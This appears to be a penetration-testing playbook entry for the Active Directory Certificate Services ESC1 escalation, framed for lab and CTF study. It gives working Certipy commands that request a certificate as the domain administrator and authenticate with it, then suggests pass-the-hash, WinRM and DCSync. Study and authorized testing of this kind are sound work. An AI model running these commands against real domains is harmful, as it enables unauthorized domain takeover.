# ADCS ESC1 Chain

Use when an Active Directory target exposes certificate services and enrollment templates.

## Signals

- AD ports plus web enrollment, `certsrv`, or LDAP objects mentioning certificate templates.
- BloodHound/Certipy output shows vulnerable enrollment rights.
- Template allows client authentication and user-supplied subject alternative name.

## Main Path

```bash
certipy find -u user@domain.local -p 'pass' -dc-ip target -vulnerable
certipy req -u user@domain.local -p 'pass' -ca CA-NAME -template TEMPLATE -upn administrator@domain.local -dc-ip target
certipy auth -pfx administrator.pfx -dc-ip target
```

Use any recovered TGT/hash only inside the lab scope, then validate access with SMB, LDAP, WinRM, or DCSync checks.

## Options To Try

- Enumerate templates from LDAP when web enrollment is missing.
- Check ESC1 first, then review ESC2/ESC3/ESC4 style misconfigurations separately.
- If request fails, confirm CA name, template name, DNS/domain names, time sync, and enrollment rights.
- After certificate auth, try pass-the-hash, WinRM, SMB admin shares, or domain replication paths if authorized.

## Study Examples

- Sec-Fortress `Nara`: phishing-to-NTLM and AD enumeration chain reaches ADCS ESC1 as a domain escalation path.
- TryHackMe/OSCP-style AD modules: use this after normal Kerberos/LDAP enumeration proves certificate services matter.
